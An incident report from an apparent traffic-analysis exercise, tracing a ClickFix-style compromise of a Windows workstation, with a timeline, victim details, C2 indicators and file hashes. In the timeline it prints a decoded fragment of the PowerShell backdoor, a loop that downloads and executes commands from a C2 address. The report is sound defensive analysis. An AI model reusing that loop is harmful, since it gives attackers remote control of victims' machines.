# Incident Report — 2025-01-22 Traffic Analysis Exercise

## Victim host
| Field | Value | Evidence |
|---|---|---|
| IPv4 | **10.1.17.215** | Consistent source across all suspicious traffic |
| MAC | **00:d0:b7:26:4a:74** | ARP (`arp.src.proto_ipv4==10.1.17.215`), matches Ethernet source on all frames from this host |
| Windows hostname | **DESKTOP-L8C5GSJ** | DHCP option 12 hostname, confirmed by NBNS (`DESKTOP-L8C5GSJ<00>/<20>`) and DNS (`DESKTOP-L8C5GSJ.bluemoontuesday.com`) |
| AD domain | BLUEMOONTUESDAY | NBNS workgroup/browser announcements, DNS suffix `bluemoontuesday.com` |
| Logged-in user | **shutchenson** | Kerberos `CNameString` in both client requests (10.1.17.215) and DC responses (10.1.17.2) |

## Malware family and attribution
**Attribution confidence: BEHAVIORAL** (no AV/IDS signature file accompanied this evidence; conclusions are based on TTP fingerprinting of the traffic only).

This is a multi-stage **ClickFix-style compromise**: a fake CAPTCHA/verification lure tricks the user into pasting and running a PowerShell command, which installs an obfuscated PowerShell backdoor, which is then used by the operator to push down legitimate **TeamViewer** for hands-on-keyboard access and finally launch a custom **.NET-style RAT that communicates over self-signed TLS on a non-standard port**. This TTP chain (disk-serial-keyed HTTP beacon, `/api/file/get-file/` retrieval API, RMM abuse, self-signed cert with `CN=<IP>: Self-signed certificate`) matches the pattern of the **Interlock ClickFix cluster**; I cannot claim this name as signature-confirmed since no AV/YARA/Suricata detection was present in the evidence.

### Reconstructed timeline (relative to capture start)
1. **t=38.2s** – DNS lookup for `google-authenticator.burleson-appliance.net` (Cloudflare-fronted, 104.21.x.x) — fake CAPTCHA/"verify you are human" lure page.
2. **t=38.9s** – TLS session to `authenticatoor.org` (82.221.136.26:443, SNI confirmed) — the ClickFix page that puts a malicious command on the clipboard.
3. **t=52.3s** – DNS lookup / TLS to `appointedtimeagriculture.com` (217.70.186.109:443) — intermediate/staging host in the delivery chain.
4. **t=60.3s** – First HTTP GET to `5.252.153.241` (`/api/file/get-file/264872`), followed at t=62.1s by `/api/file/get-file/29842.ps1`. Exported and decoded, this script is:
   ```
   $fso = New-Object -Com "Scripting.FileSystemObject"
   $SerialNumber = $fso.GetDrive("c:\").SerialNumber ... 
   $ip = 'http://5.252.153.241/'; $url = $ip+$serial
   while ($true) { $result=$s.DownloadString($url); Invoke-Expression $result; Start-Sleep -s 5 }
   ```
   This is a PowerShell backdoor that uses the C: volume serial number as a bot ID and polls the C2 every 5 seconds, blindly executing whatever is returned via `Invoke-Expression`.
5. **t=62.3s onward** – Beacon loop `GET /1517096937` (the decimal volume serial) to `5.252.153.241` repeats every ~5 seconds for the rest of the capture (duration ~3142s).
6. **t=125.0–129.0s** – C2 pushes down `TeamViewer`, `Teamviewer_Resource_fr`, `TV`, and a second copy of the loader (`pas.ps1`) via `/api/file/get-file/`.
7. **t=129.2s** – Beacon response confirms `message = startup shortcut created; status = success` — persistence via a Startup-folder shortcut.
8. **t=611.0s** – `master16.teamviewer.com` DNS/HTTP traffic begins (`din.aspx`/`dout.aspx` DynGate protocol to 185.188.32.26) — the pushed TeamViewer client is now running and phoning home to TeamViewer's legitimate infrastructure, giving the operator interactive remote-hands access.
9. **t=881.9s** – Beacon response: `script: RunRH, status: OK, message: PS process started`.
10. **t=889.6s** (7.7s later) – First TLS connection from the victim to **45.125.66.32:2917** using a **self-signed certificate** (`CN=45.125.66.32: Self-signed certificate`, `O=Self-signed certificate`, `C=XX`, bare-IP SNI). This is a second, custom RAT channel, reconnecting repeatedly (9 separate TCP sessions) for the rest of the capture — almost certainly the payload launched by the "RunRH" command.
11. Related infrastructure: **45.125.66.252:443** — same /24 as the RAT C2, long-lived TLS sessions with no SNI, likely an alternate channel on the same actor's infrastructure.

## Indicators of Compromise

### C2 endpoints
| Indicator | Evidence |
|---|---|
| `5.252.153.241:80` | PowerShell backdoor C2. Continuous `GET /1517096937` beacon (volume serial as bot ID) and `/api/file/get-file/*` payload retrieval, t=60s–3202s |
| `45.125.66.32:2917` | Secondary RAT C2. TLS with self-signed cert (`CN=45.125.66.32: Self-signed certificate`), 9 distinct sessions starting t=889.6s, immediately following the "RunRH" beacon confirmation |
| `45.125.66.252:443` | Related actor infrastructure (same /24 as above), sustained TLS sessions, no SNI, first seen t=917.4s |

### Malicious domains
| Domain | Resolved IP | Evidence |
|---|---|---|
| `authenticatoor.org` | 82.221.136.26 | DNS query t=38.9s; TLS Client Hello SNI to this domain immediately followed by the ClickFix infection chain |
| `google-authenticator.burleson-appliance.net` | 104.21.64.1 (Cloudflare) | First DNS lookup in the chain, t=38.2s, preceding `authenticatoor.org` |
| `appointedtimeagriculture.com` | 217.70.186.109 | DNS/TLS t=52.3s, intermediate host in delivery chain before backdoor activation |

### Malicious URLs
- `http://5.252.153.241/api/file/get-file/264872` (t=60.3s, initial stage-0 fetch)
- `http://5.252.153.241/api/file/get-file/29842.ps1` (t=62.1s, backdoor loader)
- `http://5.252.153.241/api/file/get-file/pas.ps1` (t=129.0s, second copy of loader)
- `http://5.252.153.241/api/file/get-file/TeamViewer`, `.../Teamviewer_Resource_fr`, `.../TV` (t=125.0–128.8s, RMM tool pushed for hands-on access)
- `http://5.252.153.241/1517096937` and `...?k=message%20=%20startup%20shortcut%20created;...` / `...?k=script:%20RunRH,...` (repeating beacon/status channel)

### Transferred files (exported from capture, SHA256 verified)
| File name | SHA256 | Notes |
|---|---|---|
| `29842.ps1` | `b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded` | Obfuscated PowerShell backdoor loader (Base64 + junk-char obfuscation) |
| `pas.ps1` | `a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e` | Identical logic to `29842.ps1`, re-delivered |
| `264872` | `c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103` | HTML text (stage-0 fetch/decoy response) |
| `TeamViewer` | `904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e` | Legitimate TeamViewer GUI executable (PE32), pushed by attacker for RMM access |
| `Teamviewer_Resource_fr` | `9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192` | TeamViewer resource DLL (PE32) |
| `TV` | `3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7` | TeamViewer support DLL (PE32) |

## Benign context (excluded from IOCs)
Windows Update (`download.windowsupdate.com`, `ctldl.windowsupdate.com`, `delivery.mp.microsoft.com`), NCSI (`msftconnecttest.com`), NTP pool servers, ad/analytics/telemetry domains (doubleclick, demdex, liveperson, clarity.ms, linkedin, facebook), Google/Microsoft cloud services, and normal AD/LDAP/Kerberos/SMB traffic to the domain controller (10.1.17.2) are all legitimate and unrelated to the compromise.

## Summary
User **shutchenson** on Windows workstation **DESKTOP-L8C5GSJ** (10.1.17.215, MAC 00:d0:b7:26:4a:74) was compromised via a fake CAPTCHA/verification page (ClickFix technique, `authenticatoor.org` / `burleson-appliance.net`) that led to execution of an obfuscated PowerShell backdoor calling home to `5.252.153.241:80`. The operator used this channel to establish Startup-folder persistence, push down and run legitimate TeamViewer for interactive remote access, and finally launch a second custom RAT that connects to `45.125.66.32:2917` over self-signed TLS. Attribution to a specific named malware family is behavioral only; no signature-based detection accompanied this capture.
